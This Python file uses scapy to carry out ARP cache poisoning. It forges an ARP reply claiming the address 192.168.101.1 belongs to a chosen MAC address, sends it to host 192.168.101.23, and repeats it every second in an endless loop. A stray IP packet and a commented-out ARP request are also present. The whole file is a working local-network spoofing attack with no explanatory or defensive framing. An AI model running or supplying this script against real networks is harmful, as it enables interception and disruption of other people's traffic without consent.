# -*- coding: utf-8 -*-
"""
Created on 2023/1/17 15:03
author: erchen
description : 
"""

from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP
import time

ip_packet = IP(dst="10.60.17.46", ttl=80)

# a = ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst='192.168.101.1')
# b = ARP(op=2, hwsrc='d8:f2:ca:6e:75:fd', psrc='192.168.101.1', hwdst="00:0c:29:f0:ba:cd", pdst='192.168.101.23')

a = ARP(op=2, hwsrc='d8:f2:ca:6e:75:fd', psrc='192.168.101.1', hwdst="00:0c:29:f0:ba:cd", pdst='192.168.101.23')
a.show()

while True:
    send(a)
    time.sleep(1)
